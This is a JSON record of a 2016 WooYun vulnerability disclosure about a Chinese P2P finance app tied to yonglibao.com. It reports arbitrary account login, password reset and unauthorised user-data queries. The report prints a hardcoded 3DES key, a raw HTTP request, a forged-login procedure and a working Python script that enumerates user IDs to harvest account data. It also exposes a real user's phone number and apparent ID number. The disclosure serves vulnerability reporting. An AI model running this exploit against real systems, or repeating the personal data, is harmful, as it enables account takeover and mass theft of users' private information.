{"id": 86242, "wybug_id": "wooyun-2016-0188850", "wybug_title": "P2P金融安全之永利宝旗下某处涉及缺陷打包", "wybug_corp": "yonglibao.com", "wybug_author": "Zhe", "wybug_date": "2016-03-27 21:12", "wybug_open_date": "2016-05-12 11:57", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向公众公开  简要描述：  详细说明：  http://android.myapp.com/myapp/detail.htm?apkName=com.huolicai.android下载火理财APPhttp://huo.yonglibao.com/经分析。此APP用的密钥算法，跟永利宝一致，可直接用于本APP数据的加解密。如何得到密钥跟算法祥见 WooYun: P2P金融安全之永利宝某处缺陷(可批量获取用户信息） 跟之前的永利宝毛病一样1.任意用户登陆/支付密码重置，两种方式，直接解密/日志打印泄露起因都是因为验证码返回客户端举例说明13103566051测试日志打印出验证码\n\n加解密脚本，解密出返回体内容\n\n输入验证码后跳转至设置密码页面\n\n设置新密码即可登陆\n\n2.接口越权查询（数据都基本都打码了，只剩名字跟）\n\n获取用户信息\nPOST http://huo.yonglibao.com/V2/User/setting HTTP/1.1X-Wap-Proxy-Cookie: noneCookie: CHANNEL=null;APP_VERSION=android_V2.3.2;TERMINAL=android_41A3945A92BD7B1D41B5AE511F7B3835%7C000000000000000;APP_TIME=1458861888009;BDUSS=;Content-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; Google Nexus 4 - 4.1.1 - API 16 - 768x1280_1 Build/JRO03S)Host: huo.yonglibao.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 107i=eb6nlXk8cpc2TjXk7%2F4XZyoohgd8bkTft3MAj4bWOIxzUSR6JzaIXN3cy7pkaj9IHuqt8zmubfDF%0AvZDdIXMFhBlT3QpBacE3%0A&\n利用脚本遍历uid后的结果\n\n3.任意用户登陆登陆的数据包\n\n解密返回体内容\nXTxpp6XhYopXJyoPaCnWHw8hfmAcoFSQPgzkKF9GeEuMUE1kHIm5JWlD9u61LA6wh+CcDufbI4iiDFatkuGscf7QJXZsSTOUhGD/oHIxvZaIO3wK1nZ8KLCtSLl7NJvOGu8UXUY210b6dVVgGrOZSWuDjgdlOaLB+xxJ+thueH570UlufnDHk/kQnootA3wdMIP0sX5UC2dKv9HRxww7mg==\n解密后\n{\"s\":1000,\"r\":{\"i\":\"1183890\",\"a\":\"13103566051\",\"p\":\"13103566051\",\"e\":\"140524197209098047\",\"r\":\"\\u6b66\\u79c0\\u4e91\",\"v\":\"1\",\"n\":\"13103566051\",\"t\":\"1458773137\"}}\n剔除干扰元素，只留下i的数值跟t，例如，i也改成1180000\n{\"s\":1000,\"r\":{\"i\":\"1180000\",\"a\":\"1\",\"p\":\"1\",\"e\":\"1\",\"r\":\"1\",\"v\":\"1\",\"n\":\"1\",\"t\":\"1458773137\"}}\n加密后\nXTxpp6XhYopXJyoPaCnWH+y1kIgGnpb+BvoqZTnsQcmhzJ20zLGCENzq/J64L44zUIR7hVooiP+4A4Dza3rY3NkgsFJ7XHd8+IWox5CcEhswg/SxflQLZ0q/0dHHDDua\n替换我们的返回体。即可登陆uid=1180000的账户\n\n查看各类信息   漏洞证明：  附上脚本\nimport pyDesimport requestsimport base64import urllibkey=\"8daluqp9xm2kw6zs1hta0000\"def DES3encrypt(param):    obj = pyDes.triple_des(key,mode=pyDes.ECB,IV=None,pad=None,padmode=pyDes.PAD_PKCS5)    d = obj.encrypt(param)    result=base64.b64encode(d)    result=urllib.quote_plus(result)    return resultdef DES3decrypt(param):    #param=urllib.unquote_plus(param)    param=base64.b64decode(param)    obj = pyDes.triple_des(key,mode=pyDes.ECB,IV=None,pad=None,padmode=pyDes.PAD_PKCS5)    result = obj.decrypt(param)    return resultdef send (payload):    headers = {'User-Agent': 'Yonglibao_from_A',\"Content-Type\":\" application/x-www-form-urlencoded; charset=UTF-8\"}    data=\"i=\"+payload+\"&\"    r = requests.post(\"http://huo.yonglibao.com/V2/User/setting\", data=data,headers=headers)    result=DES3decrypt(r.text)    return resultdef start():    fp=open(\"2.txt\",\"w+\")    #fp2=open(\"phone.txt\",\"r\")    #for i in set(fp2.readlines()):    for i in range(1180000,1181000):        userinfo=\"\"        param='''{\"u\":\"41A3945A92BD7B1D41B5AE511F7B3835|000000000000000\",\"i\":'''+str(i)+'''}'''        #print param        payload=DES3encrypt(param)        userinfo=send(payload)        print userinfo        fp.write(\"1\")        fp.write(\"\\n\")    fp.close()param='''{\"s\":1000,\"r\":{\"i\":\"1180000\",\"a\":\"1\",\"p\":\"1\",\"e\":\"1\",\"r\":\"1\",\"v\":\"1\",\"n\":\"1\",\"t\":\"1458773137\"}}'''print DES3encrypt(param)start()\n跟永利宝差不多，只剩换了请求模板   修复方案：  1.权限控制2.取消验证码回显   版权声明：转载请注明来源 Zhe@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-03-28 11:57 厂商回复： 感谢对我们的关注，马上安排工程师修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}